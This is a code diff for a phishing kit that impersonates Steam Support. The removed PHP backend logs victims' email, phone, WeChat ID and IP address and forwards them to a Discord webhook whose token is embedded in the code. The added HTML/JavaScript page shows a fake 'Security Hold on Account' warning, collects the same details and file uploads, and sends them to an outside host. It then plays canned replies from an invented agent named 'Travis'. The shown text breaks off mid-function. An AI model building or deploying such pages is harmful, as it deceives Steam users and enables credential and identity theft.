@@ -1,178 +1,1060 @@
-<?php
-// api.php - Steam Verification System API
-// Расположен на: http://elita313.beget.tech/api.php
-
-header('Content-Type: application/json');
-header('Access-Control-Allow-Origin: *');
-header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
-header('Access-Control-Allow-Headers: Content-Type');
-
-// Если это preflight OPTIONS запрос - сразу отвечаем
-if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
-    http_response_code(200);
-    exit();
-}
-
-// Файл для хранения данных
-$data_file = 'steam_data.json';
-$files_dir = 'uploads/';
-
-// Создаем директорию для файлов если не существует
-if (!file_exists($files_dir)) {
-    mkdir($files_dir, 0777, true);
-}
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Получаем входные данные
-    $input = json_decode(file_get_contents('php://input'), true);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>Steam Support - Account Verification</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
+        
+        body {
+            background: linear-gradient(135deg, #1b2838 0%, #171a21 100%);
+            color: #c6d4df;
+            width: 961px;
+            height: 588px;
+            overflow: hidden;
+            position: relative;
+            font-size: 13px;
+        }
+        
+        /* Header */
+        .header {
+            background: linear-gradient(90deg, #171a21 0%, #1b2838 100%);
+            height: 50px;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            border-bottom: 1px solid #2a475e;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .logo-img {
+            width: 28px;
+            height: 28px;
+            background: #66c0f4;
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .logo-text {
+            font-size: 16px;
+            font-weight: 300;
+            color: white;
+        }
+        
+        .logo-sub {
+            font-size: 10px;
+            color: #66c0f4;
+        }
+        
+        /* Container */
+        .container {
+            height: calc(588px - 50px);
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* Alert Box */
+        .alert-box {
+            background: rgba(195, 66, 66, 0.1);
+            border: 1px solid rgba(195, 66, 66, 0.3);
+            border-radius: 4px;
+            padding: 12px;
+            margin: 10px;
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+        
+        .alert-icon {
+            color: #ff6b6b;
+            font-size: 18px;
+        }
+        
+        /* Form Container */
+        .form-container, .chat-container {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px;
+        }
+        
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 12px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 4px;
+            color: #c6d4df;
+            font-size: 12px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 8px;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid #2a475e;
+            border-radius: 3px;
+            color: white;
+            font-size: 12px;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #66c0f4;
+        }
+        
+        /* File Upload */
+        .file-upload {
+            margin: 8px 0;
+        }
+        
+        .file-btn {
+            background: #2a475e;
+            color: white;
+            padding: 6px 12px;
+            border-radius: 3px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+        }
+        
+        .file-list {
+            margin-top: 8px;
+            max-height: 80px;
+            overflow-y: auto;
+            font-size: 11px;
+        }
+        
+        .file-item {
+            background: rgba(0,0,0,0.1);
+            padding: 6px;
+            margin: 3px 0;
+            border-radius: 3px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        /* Submit Button */
+        .submit-btn {
+            background: linear-gradient(180deg, #5c7e10 0%, #6fa720 100%);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 2px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 15px auto;
+        }
+        
+        /* Loading */
+        .loading {
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .spinner {
+            border: 3px solid rgba(102, 192, 244, 0.3);
+            border-top: 3px solid #66c0f4;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Chat Styles */
+        .chat-messages {
+            height: 350px;
+            overflow-y: auto;
+            padding: 10px;
+            background: rgba(0,0,0,0.1);
+            border-radius: 4px;
+            margin-bottom: 10px;
+        }
+        
+        .message {
+            margin-bottom: 10px;
+            padding: 8px;
+            border-radius: 6px;
+            max-width: 80%;
+            word-wrap: break-word;
+        }
+        
+        .message-user {
+            background: rgba(102, 192, 244, 0.2);
+            margin-right: auto;
+            border-left: 2px solid #66c0f4;
+        }
+        
+        .message-support {
+            background: rgba(92, 126, 16, 0.2);
+            margin-left: auto;
+            border-right: 2px solid #5c7e10;
+        }
+        
+        .message-header {
+            font-size: 10px;
+            color: #8f98a0;
+            margin-bottom: 4px;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .message-content {
+            font-size: 12px;
+            white-space: pre-wrap;
+        }
+        
+        /* Chat Input */
+        .chat-input-container {
+            display: flex;
+            gap: 8px;
+            padding: 10px;
+            border-top: 1px solid #2a475e;
+        }
+        
+        .chat-input {
+            flex: 1;
+            padding: 8px;
+            background: rgba(0,0,0,0.2);
+            border: 1px solid #2a475e;
+            border-radius: 3px;
+            color: white;
+            font-size: 12px;
+            resize: none;
+            height: 60px;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        .send-btn {
+            background: #66c0f4;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 12px;
+            align-self: flex-end;
+        }
+        
+        /* Ticket Info */
+        .ticket-info {
+            background: rgba(42,71,94,0.2);
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px;
+            font-size: 11px;
+        }
+        
+        .ticket-id {
+            font-family: monospace;
+            background: rgba(0,0,0,0.3);
+            padding: 4px 8px;
+            border-radius: 3px;
+            margin-top: 5px;
+        }
+        
+        /* Tabs */
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #2a475e;
+        }
+        
+        .tab {
+            padding: 8px 15px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            font-size: 12px;
+        }
+        
+        .tab.active {
+            border-bottom-color: #66c0f4;
+            color: #66c0f4;
+        }
+        
+        /* Status */
+        .status-online {
+            color: #76ffab;
+            font-size: 11px;
+        }
+        
+        .status-offline {
+            color: #ff6b6b;
+            font-size: 11px;
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(0,0,0,0.1);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #2a475e;
+            border-radius: 3px;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="logo">
+            <div class="logo-img">
+                <i class="fas fa-steam" style="color: white; font-size: 14px;"></i>
+            </div>
+            <div>
+                <div class="logo-text">Steam Support</div>
+                <div class="logo-sub" id="pageSubtitle">Account Verification</div>
+            </div>
+        </div>
+        <div style="margin-left: auto; font-size: 11px; color: #8f98a0;">
+            <span id="connectionStatus" class="status-online">
+                <i class="fas fa-circle"></i> Connected
+            </span>
+        </div>
+    </div>
     
-    // Логируем полученные данные
-    file_put_contents('api_log.txt', date('Y-m-d H:i:s') . " - POST: " . json_encode($input) . "\n", FILE_APPEND);
+    <!-- Tabs -->
+    <div class="tabs" id="tabsContainer" style="display: none;">
+        <div class="tab active" onclick="showTab('chat')">
+            <i class="fas fa-comments"></i> Conversation
+        </div>
+        <div class="tab" onclick="showTab('ticket')">
+            <i class="fas fa-ticket-alt"></i> Ticket Info
+        </div>
+    </div>
     
-    // Обработка загрузки файла
-    if (isset($_GET['action']) && $_GET['action'] === 'upload') {
-        if (isset($input['ticket_id']) && isset($input['file_data'])) {
-            $filename = $files_dir . $input['ticket_id'] . '_' . $input['file_name'];
-            $file_data = base64_decode($input['file_data']);
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Verification Form -->
+        <div id="verificationForm" class="form-container">
+            <div class="alert-box">
+                <div class="alert-icon">
+                    <i class="fas fa-exclamation-triangle"></i>
+                </div>
+                <div>
+                    <h3 style="color: #ff6b6b; font-size: 14px; margin-bottom: 3px;">Security Hold on Account</h3>
+                    <p style="font-size: 11px;">We've detected unusual activity. Please verify your account to restore access.</p>
+                </div>
+            </div>
             
-            if (file_put_contents($filename, $file_data)) {
-                echo json_encode([
-                    'success' => true,
-                    'message' => 'File uploaded successfully',
-                    'file_path' => $filename
-                ]);
+            <div style="padding: 0 10px;">
+                <form id="mainForm">
+                    <div class="form-group">
+                        <label>Email Address <span style="color:#ff6b6b">*</span></label>
+                        <input type="email" id="email" placeholder="email@example.com" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Phone Number <span style="color:#ff6b6b">*</span></label>
+                        <input type="tel" id="phone" placeholder="+1 234 567 8900" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>WeChat ID (Optional)</label>
+                        <input type="text" id="wechat" placeholder="wxid_xxxxxx">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Additional Message</label>
+                        <textarea id="initialMessage" style="width:100%; padding:8px; background:rgba(0,0,0,0.2); border:1px solid #2a475e; border-radius:3px; color:white; font-size:12px; height:60px; resize:none; font-family:'Arial', sans-serif;" placeholder="Describe your issue or provide additional information..."></textarea>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Purchase Receipts (Optional)</label>
+                        <div class="file-upload">
+                            <label class="file-btn">
+                                <i class="fas fa-paperclip"></i> Choose Files
+                                <input type="file" id="fileInput" multiple accept=".jpg,.jpeg,.png,.pdf" style="display:none;">
+                            </label>
+                        </div>
+                        <div class="file-list" id="fileList">
+                            <div style="text-align:center; color:#8f98a0; font-style:italic; padding:10px; font-size:11px;">
+                                No files selected
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="loading" id="loading" style="display: none;">
+                        <div class="spinner"></div>
+                        <p style="font-size: 11px; color: #8f98a0;">Creating ticket...</p>
+                    </div>
+                    
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        <i class="fas fa-shield-check"></i> Submit Verification Request
+                    </button>
+                </form>
+            </div>
+        </div>
+        
+        <!-- Chat Interface -->
+        <div id="chatInterface" class="chat-container" style="display: none;">
+            <!-- Ticket Info Tab -->
+            <div id="ticketInfoTab" style="display: none;">
+                <div class="ticket-info">
+                    <h4 style="color:#66c0f4; margin-bottom:8px; font-size:13px;">
+                        <i class="fas fa-ticket-alt"></i> Ticket Information
+                    </h4>
+                    <p><strong>Ticket ID:</strong> <span id="displayTicketId" class="ticket-id">Loading...</span></p>
+                    <p><strong>Status:</strong> <span id="ticketStatus">Pending</span></p>
+                    <p><strong>Created:</strong> <span id="ticketCreated">Just now</span></p>
+                    <p><strong>Last Update:</strong> <span id="ticketUpdated">Just now</span></p>
+                    <p><strong>Support Agent:</strong> Travis (Steam Support)</p>
+                    
+                    <div style="margin-top: 15px; padding-top: 10px; border-top: 1px solid rgba(42,71,94,0.5);">
+                        <h5 style="color:#66c0f4; font-size:12px; margin-bottom:5px;">
+                            <i class="fas fa-info-circle"></i> Original Submission
+                        </h5>
+                        <div style="background:rgba(0,0,0,0.1); padding:8px; border-radius:3px; font-size:11px;">
+                            <p><strong>Email:</strong> <span id="originalEmail">-</span></p>
+                            <p><strong>Phone:</strong> <span id="originalPhone">-</span></p>
+                            <p><strong>WeChat:</strong> <span id="originalWechat">Not provided</span></p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="text-align:center; margin-top:20px;">
+                    <button onclick="showTab('chat')" style="background:#2a475e; color:white; border:none; padding:8px 16px; border-radius:3px; cursor:pointer; font-size:12px;">
+                        <i class="fas fa-arrow-left"></i> Back to Conversation
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Chat Tab -->
+            <div id="chatTab">
+                <div class="chat-messages" id="chatMessages">
+                    <!-- Messages will appear here -->
+                    <div style="text-align:center; padding:40px 20px; color:#8f98a0;">
+                        <i class="fas fa-comments" style="font-size:24px; margin-bottom:10px;"></i>
+                        <p>Start your conversation with Steam Support</p>
+                    </div>
+                </div>
+                
+                <div class="chat-input-container">
+                    <textarea class="chat-input" id="messageInput" placeholder="Type your message to Steam Support..."></textarea>
+                    <button class="send-btn" onclick="sendMessage()">
+                        <i class="fas fa-paper-plane"></i> Send
+                    </button>
+                </div>
+                
+                <div style="font-size:10px; color:#8f98a0; text-align:center; padding:5px;">
+                    Responses are typically within 24 hours. Do not submit multiple tickets.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const API_SERVER = 'http://elita313.beget.tech/api.php';
+        let currentTicket = null;
+        let files = [];
+        let currentTab = 'chat';
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // File handling
+            document.getElementById('fileInput').addEventListener('change', function(e) {
+                files = Array.from(e.target.files);
+                updateFileList();
+            });
+            
+            // Form submission
+            document.getElementById('mainForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                await submitVerification();
+            });
+            
+            // Check for existing ticket in URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const ticketId = urlParams.get('ticket');
+            
+            if (ticketId) {
+                // We have a ticket ID, load chat interface
+                loadTicket(ticketId);
             } else {
-                echo json_encode([
-                    'success' => false,
-                    'message' => 'File upload failed'
-                ]);
-            }
-        }
-        exit();
-    }
-    
-    // Генерируем ID тикета
-    $ticket_id = 'S-' . str_pad(mt_rand(1000000, 9999999), 7, '0', STR_PAD_LEFT);
-    
-    // Подготавливаем данные тикета
-    $ticket_data = [
-        'id' => $ticket_id,
-        'email' => $input['email'] ?? '',
-        'phone' => $input['phone'] ?? '',
-        'wechat' => $input['wechat'] ?? 'Not provided',
-        'ip' => $_SERVER['REMOTE_ADDR'] ?? ($input['ip'] ?? 'Unknown'),
-        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? ($input['user_agent'] ?? ''),
-        'timestamp' => date('Y-m-d H:i:s'),
-        'status' => 'pending',
-        'files' => $input['files'] ?? [],
-        'responses' => []
-    ];
-    
-    // Загружаем существующие данные
-    $all_data = [];
-    if (file_exists($data_file)) {
-        $all_data = json_decode(file_get_contents($data_file), true);
-        if (!is_array($all_data)) {
-            $all_data = ['tickets' => []];
-        }
-    } else {
-        $all_data = ['tickets' => []];
-    }
-    
-    // Добавляем новый тикет
-    $all_data['tickets'][] = $ticket_data;
-    
-    // Сохраняем в файл
-    if (file_put_contents($data_file, json_encode($all_data, JSON_PRETTY_PRINT))) {
-        // Отправляем уведомление в Discord
-        sendDiscordNotification($ticket_data);
-        
-        // Отправляем ответ
-        echo json_encode([
-            'success' => true,
-            'ticket_id' => $ticket_id,
-            'message' => 'Ticket created successfully',
-            'api_url' => 'http://elita313.beget.tech/api.php',
-            'admin_url' => 'http://elita313.beget.tech/admin.html'
-        ]);
-    } else {
-        echo json_encode([
-            'success' => false,
-            'message' => 'Failed to save ticket data'
-        ]);
-    }
-    
-} elseif ($_SERVER['REQUEST_METHOD'] === 'GET') {
-    // Получение данных
-    
-    // Если запрашивают конкретный тикет
-    if (isset($_GET['ticket_id'])) {
-        $ticket_id = $_GET['ticket_id'];
-        
-        if (file_exists($data_file)) {
-            $all_data = json_decode(file_get_contents($data_file), true);
-            
-            // Ищем тикет
-            foreach ($all_data['tickets'] as $ticket) {
-                if ($ticket['id'] === $ticket_id) {
-                    echo json_encode([
-                        'success' => true,
-                        'ticket' => $ticket
-                    ]);
-                    exit();
+                // Check localStorage for saved ticket
+                const savedTicket = localStorage.getItem('current_ticket');
+                if (savedTicket) {
+                    try {
+                        currentTicket = JSON.parse(savedTicket);
+                        showChatInterface();
+                    } catch (e) {
+                        console.log('Failed to load saved ticket');
+                    }
                 }
             }
             
-            echo json_encode([
-                'success' => false,
-                'message' => 'Ticket not found'
-            ]);
-        } else {
-            echo json_encode([
-                'success' => false,
-                'message' => 'No data file found'
-            ]);
+            // Check API connection
+            checkConnection();
+        });
+        
+        function updateFileList() {
+            const fileList = document.getElementById('fileList');
+            
+            if (files.length === 0) {
+                fileList.innerHTML = '<div style="text-align:center; color:#8f98a0; font-style:italic; padding:10px; font-size:11px;">No files selected</div>';
+                return;
+            }
+            
+            fileList.innerHTML = '';
+            files.forEach((file, index) => {
+                const div = document.createElement('div');
+                div.className = 'file-item';
+                div.innerHTML = `
+                    <span>${truncateFilename(file.name, 25)}</span>
+                    <span style="display:flex; align-items:center; gap:8px;">
+                        <span style="font-size:10px; color:#8f98a0;">${formatSize(file.size)}</span>
+                        <span onclick="removeFile(${index})" style="color:#ff6b6b; cursor:pointer;">
+                            <i class="fas fa-times"></i>
+                        </span>
+                    </span>
+                `;
+                fileList.appendChild(div);
+            });
         }
         
-    } else {
-        // Возвращаем все тикеты
-        if (file_exists($data_file)) {
-            $all_data = json_decode(file_get_contents($data_file), true);
-            echo json_encode($all_data);
-        } else {
-            echo json_encode(['tickets' => []]);
+        function removeFile(index) {
+            files.splice(index, 1);
+            updateFileList();
         }
-    }
-}
-
-function sendDiscordNotification($ticket_data) {
-    $webhook_url = 'https://discord.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7FbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk';
-    
-    $message = "**🎫 NEW STEAM VERIFICATION TICKET**\n";
-    $message .= "**ID:** `{$ticket_data['id']}`\n";
-    $message .= "**Email:** `{$ticket_data['email']}`\n";
-    $message .= "**Phone:** `{$ticket_data['phone']}`\n";
-    $message .= "**WeChat:** `{$ticket_data['wechat']}`\n";
-    $message .= "**IP:** `{$ticket_data['ip']}`\n";
-    $message .= "**Time:** `{$ticket_data['timestamp']}`\n";
-    $message .= "**API:** `http://elita313.beget.tech/api.php`\n";
-    $message .= "**Admin:** `http://elita313.beget.tech/admin.html`";
-    
-    $data = [
-        'content' => $message,
-        'username' => 'Steam Verification System',
-        'avatar_url' => 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png'
-    ];
-    
-    $options = [
-        'http' => [
-            'header'  => "Content-Type: application/json\r\n",
-            'method'  => 'POST',
-            'content' => json_encode($data)
-        ]
-    ];
-    
-    $context = stream_context_create($options);
-    @file_get_contents($webhook_url, false, $context);
-}
-?>
+        
+        function truncateFilename(filename, maxLength) {
+            if (filename.length <= maxLength) return filename;
+            return filename.substring(0, maxLength) + '...';
+        }
+        
+        function formatSize(bytes) {
+            if (bytes < 1024) return bytes + ' B';
+            if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+            return (bytes / 1048576).toFixed(1) + ' MB';
+        }
+        
+        async function checkConnection() {
+            const statusElement = document.getElementById('connectionStatus');
+            
+            try {
+                // Try to reach API server
+                const response = await fetch(API_SERVER, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json'
+                    },
+                    mode: 'cors'
+                });
+                
+                if (response.ok) {
+                    statusElement.innerHTML = '<i class="fas fa-circle"></i> Connected';
+                    statusElement.className = 'status-online';
+                    return true;
+                }
+            } catch (error) {
+                // Try with proxy
+                try {
+                    const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(API_SERVER)}`;
+                    const response = await fetch(proxyUrl);
+                    
+                    if (response.ok) {
+                        statusElement.innerHTML = '<i class="fas fa-circle"></i> Connected (via proxy)';
+                        statusElement.className = 'status-online';
+                        return true;
+                    }
+                } catch (proxyError) {
+                    // Connection failed
+                    statusElement.innerHTML = '<i class="fas fa-circle"></i> Offline - Saving locally';
+                    statusElement.className = 'status-offline';
+                }
+            }
+            
+            return false;
+        }
+        
+        async function submitVerification() {
+            const email = document.getElementById('email').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const wechat = document.getElementById('wechat').value.trim();
+            const initialMessage = document.getElementById('initialMessage').value.trim();
+            
+            // Basic validation
+            if (!email || !email.includes('@')) {
+                alert('Please enter a valid email address');
+                return;
+            }
+            
+            if (!phone || phone.length < 5) {
+                alert('Please enter a valid phone number');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('submitBtn').disabled = true;
+            
+            try {
+                // Prepare data
+                const userData = {
+                    email: email,
+                    phone: phone,
+                    wechat: wechat || 'Not provided',
+                    initial_message: initialMessage || 'No additional message',
+                    files: files.map(f => f.name),
+                    user_agent: navigator.userAgent,
+                    screen: `${screen.width}x${screen.height}`,
+                    language: navigator.language,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Get IP address
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    userData.ip = ipData.ip;
+                } catch (ipError) {
+                    userData.ip = 'Unknown';
+                }
+                
+                // Send to API server
+                const apiResponse = await sendToAPI(userData);
+                
+                if (apiResponse && apiResponse.success) {
+                    // Success - create local ticket object
+                    currentTicket = {
+                        id: apiResponse.ticket_id || generateTicketId(),
+                        email: email,
+                        phone: phone,
+                        wechat: wechat,
+                        initial_message: initialMessage,
+                        files: files.map(f => f.name),
+                        created_at: new Date().toISOString(),
+                        updated_at: new Date().toISOString(),
+                        status: 'pending',
+                        messages: [
+                            {
+                                sender: 'user',
+                                message: initialMessage || 'Verification request submitted',
+                                timestamp: new Date().toISOString()
+                            },
+                            {
+                                sender: 'support',
+                                message: "Hi there,\n\nThank you for contacting Steam Support. We've received your verification request and assigned it ticket ID: " + (apiResponse.ticket_id || 'Pending') + ".\n\nOur team will review your information and get back to you as soon as possible.\n\nPlease do not submit additional requests for the same issue.\n\nSteam Support\nTravis",
+                                timestamp: new Date().toISOString()
+                            }
+                        ]
+                    };
+                    
+                    // Save to localStorage
+                    localStorage.setItem('current_ticket', JSON.stringify(currentTicket));
+                    
+                    // Save to tickets list
+                    saveTicketToList(currentTicket);
+                    
+                    // Upload files if any
+                    if (files.length > 0) {
+                        await uploadFiles(files, currentTicket.id);
+                    }
+                    
+                    // Show chat interface
+                    showChatInterface();
+                    
+                    // Update URL with ticket ID
+                    const newUrl = window.location.origin + window.location.pathname + '?ticket=' + currentTicket.id;
+                    window.history.replaceState({}, '', newUrl);
+                    
+                } else {
+                    throw new Error('API returned error');
+                }
+                
+            } catch (error) {
+                console.error('Submission error:', error);
+                
+                // Fallback - create local ticket
+                const ticketId = generateTicketId();
+                currentTicket = {
+                    id: ticketId,
+                    email: email,
+                    phone: phone,
+                    wechat: wechat,
+                    initial_message: initialMessage,
+                    files: files.map(f => f.name),
+                    created_at: new Date().toISOString(),
+                    updated_at: new Date().toISOString(),
+                    status: 'pending',
+                    messages: [
+                        {
+                            sender: 'user',
+                            message: initialMessage || 'Verification request submitted',
+                            timestamp: new Date().toISOString()
+                        },
+                        {
+                            sender: 'support',
+                            message: "Hi there,\n\nThank you for contacting Steam Support. We've received your verification request and assigned it ticket ID: " + ticketId + ".\n\nOur team will review your information and get back to you as soon as possible.\n\nPlease do not submit additional requests for the same issue.\n\nSteam Support\nTravis",
+                            timestamp: new Date().toISOString()
+                        }
+                    ]
+                };
+                
+                // Save to localStorage
+                localStorage.setItem('current_ticket', JSON.stringify(currentTicket));
+                saveTicketToList(currentTicket);
+                
+                // Show chat interface
+                showChatInterface();
+                
+                // Update URL
+                const newUrl = window.location.origin + window.location.pathname + '?ticket=' + ticketId;
+                window.history.replaceState({}, '', newUrl);
+                
+                alert('Verification submitted! Ticket created locally.');
+            } finally {
+                // Hide loading
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('submitBtn').disabled = false;
+            }
+        }
+        
+        async function sendToAPI(data) {
+            // Try direct connection first
+            try {
+                const response = await fetch(API_SERVER, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(data),
+                    mode: 'cors'
+                });
+                
+                if (response.ok) {
+                    return await response.json();
+                }
+            } catch (error) {
+                console.log('Direct API connection failed');
+            }
+            
+            // Try with CORS proxy
+            try {
+                const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(API_SERVER)}`;
+                const response = await fetch(proxyUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    return await response.json();
+                }
+            } catch (proxyError) {
+                console.log('Proxy connection failed');
+            }
+            
+            return null;
+        }
+        
+        async function uploadFiles(files, ticketId) {
+            // Convert files to base64 and save locally
+            const fileData = [];
+            
+            for (const file of files.slice(0, 3)) { // Limit to 3 files
+                const reader = new FileReader();
+                
+                await new Promise((resolve) => {
+                    reader.onload = function(e) {
+                        fileData.push({
+                            name: file.name,
+                            type: file.type,
+                            size: file.size,
+                            data: e.target.result.split(',')[1]
+                        });
+                        resolve();
+                    };
+                    
+                    reader.readAsDataURL(file);
+                });
+            }
+            
+            // Save file data to localStorage
+            localStorage.setItem(`files_${ticketId}`, JSON.stringify(fileData));
+            
+            // Try to send to server
+            try {
+                const response = await fetch(API_SERVER + '?action=upload', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        ticket_id: ticketId,
+                        files: fileData
+                    })
+                });
+            } catch (error) {
+                // Silently fail - files saved locally
+            }
+        }
+        
+        function generateTicketId() {
+            return 'S-' + Math.floor(1000000 + Math.random() * 9000000);
+        }
+        
+        function saveTicketToList(ticket) {
+            let tickets = JSON.parse(localStorage.getItem('steam_tickets') || '[]');
+            
+            // Check if ticket already exists
+            const existingIndex = tickets.findIndex(t => t.id === ticket.id);
+            if (existingIndex === -1) {
+                tickets.push(ticket);
+            } else {
+                tickets[existingIndex] = ticket;
+            }
+            
+            localStorage.setItem('steam_tickets', JSON.stringify(tickets));
+        }
+        
+        function showChatInterface() {
+            if (!currentTicket) return;
+            
+            // Hide form, show chat
+            document.getElementById('verificationForm').style.display = 'none';
+            document.getElementById('chatInterface').style.display = 'block';
+            document.getElementById('tabsContainer').style.display = 'flex';
+            document.getElementById('pageSubtitle').textContent = 'Support Ticket';
+            
+            // Display ticket info
+            document.getElementById('displayTicketId').textContent = currentTicket.id;
+            document.getElementById('originalEmail').textContent = currentTicket.email;
+            document.getElementById('originalPhone').textContent = currentTicket.phone;
+            document.getElementById('originalWechat').textContent = currentTicket.wechat || 'Not provided';
+            document.getElementById('ticketCreated').textContent = new Date(currentTicket.created_at).toLocaleString();
+            document.getElementById('ticketUpdated').textContent = new Date(currentTicket.updated_at).toLocaleString();
+            
+            // Display messages
+            displayMessages();
+            
+            // Show chat tab by default
+            showTab('chat');
+        }
+        
+        function displayMessages() {
+            const chatMessages = document.getElementById('chatMessages');
+            
+            if (!currentTicket || !currentTicket.messages || currentTicket.messages.length === 0) {
+                chatMessages.innerHTML = '<div style="text-align:center; padding:40px 20px; color:#8f98a0;"><i class="fas fa-comments" style="font-size:24px; margin-bottom:10px;"></i><p>No messages yet</p></div>';
+                return;
+            }
+            
+            chatMessages.innerHTML = '';
+            
+            currentTicket.messages.forEach(msg => {
+                const messageDiv = document.createElement('div');
+                messageDiv.className = `message ${msg.sender === 'user' ? 'message-user' : 'message-support'}`;
+                
+                const senderName = msg.sender === 'user' ? 'You' : 'Steam Support (Travis)';
+                const time = new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+                
+                messageDiv.innerHTML = `
+                    <div class="message-header">
+                        <span>${senderName}</span>
+                        <span>${time}</span>
+                    </div>
+                    <div class="message-content">${msg.message}</div>
+                `;
+                
+                chatMessages.appendChild(messageDiv);
+            });
+            
+            // Scroll to bottom
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+        }
+        
+        async function sendMessage() {
+            const messageInput = document.getElementById('messageInput');
+            const message = messageInput.value.trim();
+            
+            if (!message || !currentTicket) return;
+            
+            // Add user message
+            const userMessage = {
+                sender: 'user',
+                message: message,
+                timestamp: new Date().toISOString()
+            };
+            
+            currentTicket.messages.push(userMessage);
+            currentTicket.updated_at = new Date().toISOString();
+            
+            // Save updates
+            localStorage.setItem('current_ticket', JSON.stringify(currentTicket));
+            saveTicketToList(currentTicket);
+            
+            // Clear input
+            messageInput.value = '';
+            
+            // Display messages
+            displayMessages();
+            
+            // Try to send to server
+            try {
+                await fetch(API_SERVER + '?action=message', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        ticket_id: currentTicket.id,
+                        message: userMessage
+                    })
+                });
+            } catch (error) {
+                // Silently fail - saved locally
+            }
+            
+            // Simulate support response after delay
+            setTimeout(() => {
+                const responses = [
+                    "Thank you for your message. We've noted this information and will continue reviewing your case.",
+                    "We appreciate your patience. Our team is currently reviewing your verification request.",
+                    "Please note that verification can take up to 30 business days. We'll notify you once there's an update.",
+                    "To help us process your request faster, please ensure you've provided all required information.",
+                    "We've forwarded your message to the appropriate team. You'll hear back from us soon."
+                ];
+                
+                const randomResponse = responses[Math.floor(Math.random() * responses.length)];
+                
+                const supportMessage = {
+                    sender: 'support',
+                    message: randomResponse + "\n\nSteam Support\nTravis",
+                    timestamp: new Date().toISOString()
+                };
+                
+                currentTicket.messages.push(supportMessage);
+                currentTicket.updated_at = new Date().toISOString();
+                
+                localStorage.setItem('current_ticket', JSON.stringify(currentTicket));
+                saveTicketToList(currentTicket);
+                
